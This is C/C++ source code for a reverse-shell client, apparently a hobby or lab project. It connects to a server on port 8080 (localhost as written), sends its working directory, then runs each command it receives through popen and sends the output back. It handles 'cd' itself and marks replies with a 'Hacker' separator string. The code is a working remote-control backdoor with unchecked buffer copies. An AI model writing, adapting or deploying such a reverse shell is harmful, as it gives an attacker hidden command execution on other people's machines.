#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
//#include "file_server.h"
//#include "screen_client.h"
#include <vector>

#define PORT (8080)
#define BUFFER_SIZE (1024)
#define SEPARATOR ("<!!!!!!Hacker!!!!!>")

//vector<string> split(string str, string token){
//    vector<string>result;
//    while(str.size()){
//        int index = str.find(token);
//        if(index!=string::npos){
//            result.push_back(str.substr(0,index));
//            str = str.substr(index+token.size());
//            if(str.size()==0)result.push_back(str);
//        }else{
//            result.push_back(str);
//            str = "";
//        }
//    }
//    return result;
//}
int main() {
  int client_fd;
  struct sockaddr_in server_addr;
  char buffer[BUFFER_SIZE];
  char cwd[BUFFER_SIZE];
  FILE *fp;

  client_fd = socket(AF_INET, SOCK_STREAM, 0);

  if (client_fd < 0) {
    perror("socket setup failed\n");
    return -1;
  }

  /* Set up the server address and port                           */

  server_addr.sin_family = AF_INET;
  inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
  server_addr.sin_port = htons(PORT);

  /* Connect to the server                                        */

  if (connect(client_fd, (struct sockaddr *) &server_addr,
      sizeof(server_addr)) < 0) {
    perror("connection failed\n");
    return -1;
  }

  /* Send current working directory                               */

  getcwd(cwd, BUFFER_SIZE); //curent directory
  if (send(client_fd, cwd, BUFFER_SIZE, 0) < 0) {
    perror("send cwd failed");
    return -1;
  }

  while (1) {
    memset(buffer, 0, BUFFER_SIZE);
    if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
      perror("recv failed\n");
      return -1;
    }
    //if (strncmp(buffer, "get", 2) == 0) {
    //  vector<string> args = split(buffer," ");
    //  setup_server_ftp(atoi(args[3].c_str()),args[2]);
    //}
    if (strncmp(buffer, "cd", 2) == 0) {
      strcpy(cwd, &buffer[3]);
      cwd[strlen(&buffer[2])] = '\0';

      if (chdir(cwd)) {
        perror("change directory failed");
        char chdir_fail_mesg[] = "Change Directroy Failed\n";
        strcpy(buffer, chdir_fail_mesg);
        buffer[strlen(chdir_fail_mesg)] = '\0';
      }

      getcwd(cwd, BUFFER_SIZE);

      strcat(buffer, "\n");
      strcat(buffer, SEPARATOR);
      strcat(buffer, cwd);

      if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
        perror("send failed");
        return -1;
      }
    }
    else {
      if (chdir(cwd)) {
        perror("change directory failed");
        return -1;
      }
      fp = popen(buffer, "r");
      memset(buffer, 0, BUFFER_SIZE);
      if (!fp) {
        perror("peopen failed");
      }

      while (true) {
        char line[BUFFER_SIZE];
        int status = fscanf(fp, "%[^\n]%*c", line);
        if (status != 1) {
          break;
        }
        strcat(buffer, line);
        strcat(buffer, "\n");
      }

      strcat(buffer, SEPARATOR);
      strcat(buffer, cwd);

      printf("%s\n", buffer);     // uncomment for more details
      if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
        perror("send failed");
        return -1;
      }
      pclose(fp);
    }
  }
}